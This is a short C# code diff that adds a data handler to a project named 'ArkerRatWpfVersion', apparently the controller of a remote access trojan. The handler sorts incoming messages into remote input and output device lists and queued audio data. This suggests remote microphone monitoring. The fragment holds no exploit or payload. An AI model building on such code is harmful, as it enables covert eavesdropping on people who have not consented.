@@ -150,6 +150,24 @@ namespace ArkerRatWpfVersion
             }
         }
 
+        public void HandleData(string subString)
+        {
+            if (subString.Contains("§ODS§"))
+            {
+                subString = subString.Replace("§ODS§", string.Empty);
+                Task.Run(() => AddODevices(subString));
+            }
+            else if (subString.Contains("§IDS§"))
+            {
+                subString = subString.Replace("§IDS§", string.Empty);
+                Task.Run(() => AddIDevices(subString));
+            }
+            else
+            {
+                EnqueAudioData(subString);
+            }
+        }
+
         private async void SendOutputDeviceChoice(object sender, SelectionChangedEventArgs e)
         {
             OutputSoundDeviceList.IsEnabled = false;
